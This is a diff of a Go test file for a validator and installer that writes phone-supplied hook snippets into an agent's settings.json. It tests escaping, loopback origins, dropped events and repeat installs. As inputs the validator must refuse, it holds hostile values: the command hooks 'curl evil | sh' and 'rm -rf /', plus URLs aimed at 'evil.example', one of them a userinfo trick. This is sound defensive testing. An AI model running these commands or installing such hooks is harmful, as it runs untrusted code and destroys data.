@@ -87,9 +87,9 @@ func TestSubstituteAndValidate(t *testing.T) {
 	if string(got) != want {
 		t.Fatalf("Substitute =\n%s\nwant\n%s", got, want)
 	}
-	hooks, err := ValidateSnippet(got, snippetConfig)
-	if err != nil {
-		t.Fatalf("ValidateSnippet: %v", err)
+	hooks, dropped, err := ValidateSnippet(got, snippetConfig)
+	if err != nil || dropped != nil {
+		t.Fatalf("ValidateSnippet: %v, dropped %q", err, dropped)
 	}
 	if got := compact(t, hooks); got != want {
 		t.Errorf("ValidateSnippet =\n%s\nwant the snippet unchanged\n%s", got, want)
@@ -105,12 +105,167 @@ func TestValidateSnippetKeepsThePhoneTemplate(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	hooks, err := ValidateSnippet(Substitute(template, 7317, "t0k3n", "walter-laptop", exePath), snippetConfig)
+	hooks, _, err := ValidateSnippet(Substitute(template, 7317, "t0k3n", "walter-laptop", exePath), snippetConfig)
 	if err != nil {
 		t.Fatalf("ValidateSnippet: %v", err)
 	}
 	if got, want := compact(t, hooks), compact(t, defaultHooks()); got != want {
 		t.Errorf("rebuilt template =\n%s\nwant RenderHooks' default\n%s", got, want)
+	}
+}
+
+// phoneTemplate is the phone's relayTemplate() with its defaults.
+func phoneTemplate(t *testing.T) []byte {
+	t.Helper()
+	template, err := os.ReadFile("testdata/phone-relay-snippet.json")
+	if err != nil {
+		t.Fatal(err)
+	}
+	return template
+}
+
+// hookAt returns the first hook of an event's first group in a hooks block.
+func hookAt(t *testing.T, block ojson.Value, event string) *ojson.Object {
+	t.Helper()
+	hooks := ojson.AsObject(mustGet(t, ojson.AsObject(block), "hooks"))
+	groups := ojson.AsArray(mustGet(t, hooks, event))
+	if len(groups) == 0 {
+		t.Fatalf("%s has no group", event)
+	}
+	inner := ojson.AsArray(mustGet(t, ojson.AsObject(groups[0]), "hooks"))
+	if len(inner) == 0 {
+		t.Fatalf("%s has no hook", event)
+	}
+	return ojson.AsObject(inner[0])
+}
+
+// Every value lands inside a JSON string, so it is escaped for one: the
+// quotes either platform's shell quoting adds must not end the string. This
+// runs the quoting of both platforms on any GOOS.
+func TestSubstituteEscapesEveryValueForJSON(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct{ name, quotedExe, token, host string }{
+		{name: "a Windows path with a space", quotedExe: `"C:/Program Files/clair/clair.exe"`, token: "t0k3n", host: "walter-laptop"},
+		{name: "a Unix path with a single quote", quotedExe: `'/opt/it'"'"'s/clair'`, token: "t0k3n", host: "walter-laptop"},
+		{name: "a Unix path with a double quote and a backslash", quotedExe: `'/opt/say "hi"\/clair'`, token: "t0k3n", host: "walter-laptop"},
+		{name: "a token and a host that need escaping", quotedExe: "/opt/clair/clair", token: `t"0\k`, host: "a\"b\nc"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			out := substituteQuoted(phoneTemplate(t), "7317", tt.token, tt.host, tt.quotedExe)
+			v, err := ojson.ParseBytes(out)
+			if err != nil {
+				t.Fatalf("substituted snippet is not JSON: %v\n%s", err, out)
+			}
+			if got, want := ojson.AsString(mustGet(t, hookAt(t, v, "SessionStart"), "command")), tt.quotedExe+" hook-event /clair/v1/hook/event"; got != want {
+				t.Errorf("SessionStart command = %q, want %q", got, want)
+			}
+			headers := ojson.AsObject(mustGet(t, hookAt(t, v, "Stop"), "headers"))
+			if got := ojson.AsString(mustGet(t, headers, "Authorization")); got != "Bearer "+tt.token {
+				t.Errorf("Authorization = %q, want the token as given", got)
+			}
+			if got := ojson.AsString(mustGet(t, headers, "X-Clair-Host")); got != tt.host {
+				t.Errorf("X-Clair-Host = %q, want %q", got, tt.host)
+			}
+		})
+	}
+}
+
+// checkPhoneSnippetFor substitutes the phone's template for a binary at exe
+// on this platform, and wants it accepted and rebuilt into the built-in
+// block for that binary, then installed and read back.
+func checkPhoneSnippetFor(t *testing.T, exe string) {
+	t.Helper()
+	c := SnippetConfig{BaseURL: baseURL, Token: "t0k3n", Host: "walter-laptop", ClairExe: exe}
+	hooks, dropped, err := ValidateSnippet(Substitute(phoneTemplate(t), 7317, c.Token, c.Host, exe), c)
+	if err != nil || dropped != nil {
+		t.Fatalf("ValidateSnippet for %q: %v, dropped %q", exe, err, dropped)
+	}
+	c.IncludeSessionStart = true
+	if got, want := compact(t, hooks), compact(t, RenderHooks(c)); got != want {
+		t.Errorf("rebuilt for %q =\n%s\nwant the built-in block\n%s", exe, got, want)
+	}
+	in := fixture(t, "")
+	in.ClairExe = exe
+	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: c.Token, Host: c.Host}
+	if _, err := si.InstallSnippet(phoneTemplate(t)); err != nil {
+		t.Fatalf("InstallSnippet for %q: %v", exe, err)
+	}
+	if got := ojson.AsString(mustGet(t, hookAt(t, readSettings(t, in), "SessionStart"), "command")); got != HookEventCommand(exe) {
+		t.Errorf("installed SessionStart command = %q, want %q", got, HookEventCommand(exe))
+	}
+}
+
+// A binary path the shell must quote still yields a snippet the validator
+// accepts: the phone's own template, not a hand-made one.
+func TestPhoneSnippetForAnAwkwardBinaryPath(t *testing.T) {
+	t.Parallel()
+
+	for _, exe := range []string{"/opt/my tools/clair", "/opt/it's/clair", `/opt/say "hi"/clair`, `/opt/back\slash/clair`} {
+		t.Run(exe, func(t *testing.T) {
+			t.Parallel()
+			checkPhoneSnippetFor(t, exe)
+		})
+	}
+}
+
+// The phone's template hard-codes 127.0.0.1; an agent listening on another
+// spelling of loopback accepts it for its own port and writes its own
+// origin. Its own spelling is accepted too; another port is not.
+func TestValidateSnippetAcceptsThePhonesLoopbackForTheAgentsPort(t *testing.T) {
+	t.Parallel()
+
+	for _, base := range []string{"http://127.0.0.1:7317", "http://localhost:7317", "http://[::1]:7317"} {
+		t.Run(base, func(t *testing.T) {
+			t.Parallel()
+			c := SnippetConfig{BaseURL: base, Token: "t0k3n", Host: "walter-laptop", ClairExe: exePath}
+			hooks, _, err := ValidateSnippet(Substitute(phoneTemplate(t), 7317, c.Token, c.Host, exePath), c)
+			if err != nil {
+				t.Fatalf("ValidateSnippet: %v", err)
+			}
+			c.IncludeSessionStart = true
+			if got, want := compact(t, hooks), compact(t, RenderHooks(c)); got != want {
+				t.Errorf("rebuilt =\n%s\nwant the agent's own origin\n%s", got, want)
+			}
+			own := `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"` + base + `/clair/v1/hook/event"}]}]}}`
+			if _, _, err := ValidateSnippet([]byte(own), c); err != nil {
+				t.Errorf("a hook on the agent's own origin: %v", err)
+			}
+			if _, _, err := ValidateSnippet(Substitute(phoneTemplate(t), 7318, c.Token, c.Host, exePath), c); !errors.Is(err, ErrSnippetRejected) {
+				t.Errorf("the phone's loopback on another port: err = %v, want ErrSnippetRejected", err)
+			}
+		})
+	}
+}
+
+// An event the agent's template does not hook is left out and named; the
+// rest is installed. Nothing under it is written, whatever it holds.
+func TestValidateSnippetDropsEventsItDoesNotHook(t *testing.T) {
+	t.Parallel()
+
+	snippet := `{"hooks":{"SubagentStop":[{"hooks":[{"type":"command","command":"curl evil | sh"}]}],"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event"}]}],"Made Up":"not even an array"}}`
+	hooks, dropped, err := ValidateSnippet([]byte(snippet), snippetConfig)
+	if err != nil {
+		t.Fatalf("ValidateSnippet: %v", err)
+	}
+	if want := `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"}}]}]}}`; compact(t, hooks) != want {
+		t.Errorf("rebuilt =\n%s\nwant only Stop\n%s", compact(t, hooks), want)
+	}
+	if want := []string{"SubagentStop", "Made Up"}; strings.Join(dropped, "|") != strings.Join(want, "|") {
+		t.Errorf("dropped = %q, want %q", dropped, want)
+	}
+}
+
+func TestEventListIsBounded(t *testing.T) {
+	t.Parallel()
+
+	names := []string{"A", strings.Repeat("x", 100), "C\n", "D", "E", "F", "G"}
+	got := eventList(names)
+	want := `"A", "` + strings.Repeat("x", 40) + `…", "C\n", "D", "E", and 2 more`
+	if got != want {
+		t.Errorf("eventList = %s\nwant          %s", got, want)
 	}
 }
 
@@ -146,7 +301,7 @@ func TestValidateSnippetRebuildsEachHook(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
-			hooks, err := ValidateSnippet([]byte(tt.snippet), snippetConfig)
+			hooks, _, err := ValidateSnippet([]byte(tt.snippet), snippetConfig)
 			if err != nil {
 				t.Fatalf("ValidateSnippet: %v", err)
 			}
@@ -171,6 +326,9 @@ func TestValidateSnippetRejects(t *testing.T) {
 		{"own command hook on PermissionRequest", hook("PermissionRequest", `{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event"}`)},
 		{"foreign url", hook("Stop", http("https://evil.example/clair/v1/hook/event"))},
 		{"other loopback", hook("Stop", http("http://127.0.0.1:9999/clair/v1/hook/event"))},
+		{"another loopback spelling than the agent's or the phone's", hook("Stop", http("http://localhost:7317/clair/v1/hook/event"))},
+		{"the canonical host on a longer port", hook("Stop", http("http://127.0.0.1:73170/clair/v1/hook/event"))},
+		{"userinfo after the origin", hook("Stop", http("http://127.0.0.1:7317@evil.example/clair/v1/hook/event"))},
 		{"outside the prefix", hook("Stop", http(baseURL+"/other"))},
 		{"Stop routed to decide", hook("Stop", http(decide))},
 		{"PreToolUse routed to decide", hook("PreToolUse", http(decide+"?timeout=30"))},
@@ -187,6 +345,8 @@ func TestValidateSnippetRejects(t *testing.T) {
 		{"a matcher that is not a string", `{"hooks":{"Stop":[{"matcher":1,"hooks":[` + http(event) + `]}]}}`},
 		{"no type", hook("Stop", `{"url":"`+event+`"}`)},
 		{"missing hooks", `{"permissions":{}}`},
+		{"no events", `{"hooks":{}}`},
+		{"only events the agent does not hook", hook("FutureEvent", http(event))},
 		{"hooks not object", `{"hooks":[]}`},
 		{"group not object", `{"hooks":{"Stop":["x"]}}`},
 		{"event not array", `{"hooks":{"Stop":{}}}`},
@@ -202,14 +362,14 @@ func TestValidateSnippetRejects(t *testing.T) {
 	for _, tt := range rejected {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
-			if _, err := ValidateSnippet([]byte(tt.snippet), snippetConfig); !errors.Is(err, ErrSnippetRejected) {
+			if _, _, err := ValidateSnippet([]byte(tt.snippet), snippetConfig); !errors.Is(err, ErrSnippetRejected) {
 				t.Errorf("err = %v, want ErrSnippetRejected", err)
 			}
 		})
 	}
 	noExe := snippetConfig
 	noExe.ClairExe = ""
-	if _, err := ValidateSnippet([]byte(hook("SessionStart", `{"type":"command","command":" hook-event /clair/v1/hook/event"}`)), noExe); !errors.Is(err, ErrSnippetRejected) {
+	if _, _, err := ValidateSnippet([]byte(hook("SessionStart", `{"type":"command","command":" hook-event /clair/v1/hook/event"}`)), noExe); !errors.Is(err, ErrSnippetRejected) {
 		t.Errorf("command hook without a known binary: err = %v, want ErrSnippetRejected", err)
 	}
 }
@@ -357,9 +517,14 @@ func TestInstallMergesLikeThePhoneInstaller(t *testing.T) {
 		t.Errorf("backups = %v, want exactly one", got)
 	}
 
-	// Installing again neither duplicates nor wraps the wrapper.
-	if _, again := in.Install(defaultHooks()); again != nil {
-		t.Fatalf("second Install: %v", again)
+	// Installing again neither duplicates nor wraps the wrapper; it finds
+	// nothing to change and writes nothing.
+	report, err = in.Install(defaultHooks())
+	if err != nil {
+		t.Fatalf("second Install: %v", err)
+	}
+	if !report.Unchanged || report.Backup != "" {
+		t.Errorf("second install report = %+v, want unchanged without a backup", report)
 	}
 	s = readSettings(t, in)
 	hooks = ojson.AsObject(mustGet(t, s, "hooks"))
@@ -375,8 +540,8 @@ func TestInstallMergesLikeThePhoneInstaller(t *testing.T) {
 	if saved, _ := os.ReadFile(in.originalPath()); !strings.Contains(string(saved), "printf") {
 		t.Errorf("original.json after a second install = %s, want the user's command still", saved)
 	}
-	if got := backups(t, in); len(got) != 2 {
-		t.Errorf("backups after two installs = %v, want two", got)
+	if got := backups(t, in); len(got) != 1 {
+		t.Errorf("backups after two installs = %v, want only the first's", got)
 	}
 
 	// Uninstall puts everything back.
@@ -642,7 +807,7 @@ func TestSnippetInstaller(t *testing.T) {
 	in := fixture(t, "")
 	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
 	good := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:__PORT__/clair/v1/hook/event","headers":{"Authorization":"Bearer __TOKEN__","X-Clair-Host":"__CLAIR_HOST__"},"timeout":2}]}]}}`)
-	if err := si.InstallSnippet(good); err != nil {
+	if _, err := si.InstallSnippet(good); err != nil {
 		t.Fatalf("InstallSnippet: %v", err)
 	}
 	s := readSettings(t, in)
@@ -650,7 +815,7 @@ func TestSnippetInstaller(t *testing.T) {
 		t.Errorf("hooks = %s", got)
 	}
 	bad := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"rm -rf /"}]}]}}`)
-	if err := si.InstallSnippet(bad); !errors.Is(err, ErrSnippetRejected) {
+	if _, err := si.InstallSnippet(bad); !errors.Is(err, ErrSnippetRejected) {
 		t.Errorf("InstallSnippet(command hook): err = %v, want ErrSnippetRejected", err)
 	}
 	if err := si.Uninstall(); err != nil {
@@ -658,6 +823,104 @@ func TestSnippetInstaller(t *testing.T) {
 	}
 	if _, ok := readSettings(t, in).Get("hooks"); ok {
 		t.Error("hooks remain after Uninstall")
+	}
+}
+
+// Installing the snippet that is already installed — the phone may send it
+// again — rewrites nothing and backs nothing up.
+func TestInstallSnippetTwiceWritesOnce(t *testing.T) {
+	t.Parallel()
+
+	in := fixture(t, `{"permissions":{},"statusLine":{"type":"command","command":"printf ok"}}`)
+	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
+	first, err := si.InstallSnippet(phoneTemplate(t))
+	if err != nil || first.Unchanged || first.Backup == "" {
+		t.Fatalf("first InstallSnippet = %+v, %v; want a write with a backup", first, err)
+	}
+	old := time.Date(2001, 1, 1, 0, 0, 0, 0, time.UTC)
+	for _, path := range []string{in.SettingsPath, in.originalPath()} {
+		if cerr := os.Chtimes(path, old, old); cerr != nil {
+			t.Fatal(cerr)
+		}
+	}
+	before, _ := os.ReadFile(in.SettingsPath)
+	again, err := si.InstallSnippet(phoneTemplate(t))
+	if err != nil || !again.Unchanged || again.Backup != "" {
+		t.Fatalf("second InstallSnippet = %+v, %v; want unchanged", again, err)
+	}
+	for _, path := range []string{in.SettingsPath, in.originalPath()} {
+		if info, err := os.Stat(path); err != nil || !info.ModTime().Equal(old) {
+			t.Errorf("%s was rewritten (%v)", filepath.Base(path), err)
+		}
+	}
+	if after, _ := os.ReadFile(in.SettingsPath); !bytes.Equal(before, after) {
+		t.Error("settings.json changed")
+	}
+	if got := backups(t, in); len(got) != 1 {
+		t.Errorf("backups = %v, want only the first install's", got)
+	}
+	// A different snippet is written again.
+	changed := bytes.Replace(phoneTemplate(t), []byte(`"timeout": 2`), []byte(`"timeout": 3`), 1)
+	if r, err := si.InstallSnippet(changed); err != nil || r.Unchanged || r.Backup == "" {
+		t.Errorf("a changed snippet: %+v, %v; want a write with a backup", r, err)
+	}
+}
+
+// At pairing a phone never leaves the host without hooks: a refused
+// snippet gives way to the built-in block, with the offence named, and only
+// a settings.json that cannot be written at all is an error.
+func TestInstallAtPairing(t *testing.T) {
+	t.Parallel()
+
+	builtIn := compact(t, ojson.AsObject(defaultHooks()))
+	refused := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"rm -rf /"}]}]}}`)
+	tests := []struct {
+		name      string
+		settings  string
+		snippet   json.RawMessage
+		wantErr   bool
+		wantWarns []string // substrings, one per warning
+	}{
+		{name: "no snippet", snippet: nil},
+		{name: "a null snippet", snippet: json.RawMessage(`null`)},
+		{name: "the phone's template", snippet: phoneTemplate(t)},
+		{name: "a refused snippet", snippet: refused, wantWarns: []string{"refused (claudecfg: snippet rejected: Stop has a command hook other than"}},
+		{name: "a snippet that is not JSON", snippet: json.RawMessage(`{`), wantWarns: []string{"built-in hooks were written instead"}},
+		{
+			name:      "events the agent does not hook",
+			snippet:   bytes.Replace(phoneTemplate(t), []byte(`"SessionStart"`), []byte(`"SubagentStart"`), 1),
+			wantWarns: []string{`left out: "SubagentStart"`},
+		},
+		{name: "settings.json that is not an object", settings: `[1]`, snippet: phoneTemplate(t), wantErr: true},
+		{name: "a refused snippet and settings.json that is not an object", settings: `[1]`, snippet: refused, wantErr: true, wantWarns: []string{"refused"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			in := fixture(t, tt.settings)
+			si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
+			report, err := si.InstallAtPairing(tt.snippet)
+			if (err != nil) != tt.wantErr {
+				t.Fatalf("InstallAtPairing: err = %v, want error %v", err, tt.wantErr)
+			}
+			warns := report.Warnings()
+			if len(warns) != len(tt.wantWarns) {
+				t.Fatalf("warnings = %q, want %d", warns, len(tt.wantWarns))
+			}
+			for i, want := range tt.wantWarns {
+				if !strings.Contains(warns[i], want) {
+					t.Errorf("warning %d = %q, want it to contain %q", i, warns[i], want)
+				}
+			}
+			if tt.wantErr {
+				return
+			}
+			hooks := ojson.NewObject()
+			hooks.Set("hooks", mustGet(t, readSettings(t, in), "hooks"))
+			if got := compact(t, hooks); !strings.Contains(tt.name, "does not hook") && got != builtIn {
+				t.Errorf("hooks =\n%s\nwant the built-in block\n%s", got, builtIn)
+			}
+		})
 	}
 }
 
